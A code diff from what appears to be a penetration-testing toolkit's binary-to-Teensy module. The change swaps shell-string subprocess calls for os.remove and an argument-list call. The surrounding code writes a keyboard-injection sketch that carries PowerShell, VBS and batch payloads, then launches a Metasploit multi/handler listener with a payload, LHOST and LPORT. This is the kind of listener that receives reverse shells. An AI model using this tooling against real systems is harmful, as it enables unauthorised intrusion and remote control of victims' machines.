@@ -310,7 +310,8 @@ Keyboard.set_key1(0);
 Keyboard.send_now();
 }""" % (random_filename,random_filename,powershell_command,vbs,bat,vbs,vbs,random_filename,alpha_payload,bat,vbs))
 # delete temporary file
-subprocess.Popen("rm %s 1> /dev/null 2>/dev/null" % (random_filename), shell=True).wait()
+if os.path.isfile(random_filename):
+    os.remove(random_filename)
 if not os.path.isdir(userconfigpath + "reports"): os.makedirs(userconfigpath + "reports")
 print_status("Binary to Teensy file exported as %sreports/binary2teensy" % (userconfigpath))
 # write the teensy.ino file out
@@ -318,12 +319,13 @@ with open(userconfigpath + "reports/binary2teensy.ino", "w", encoding="utf-8") a
     filewrite.write(output_variable)
 print_status("Generating a listener...")
 # create our metasploit answer file
-with open(userconfigpath + "answer.txt", "w", encoding="utf-8") as filewrite:
+answer_path = userconfigpath + "answer.txt"
+with open(answer_path, "w", encoding="utf-8") as filewrite:
     filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\n%s\nexploit -j" % (payload,ipaddr,port,url))
 # spawn a multi/handler listener
-subprocess.Popen("msfconsole -r %sanswer.txt" % (userconfigpath), shell=True).wait()
+subprocess.Popen(["msfconsole", "-r", answer_path]).wait()
 print_status("[*] Housekeeping old files...")
 # if our answer file is still there (which it should be), then remove it
-if os.path.isfile(userconfigpath + "answer.txt"):
+if os.path.isfile(answer_path):
     # remove the old file, no longer used once we've exited
-    subprocess.Popen("rm " + userconfigpath + "answer.txt", shell=True).wait()
+    os.remove(answer_path)
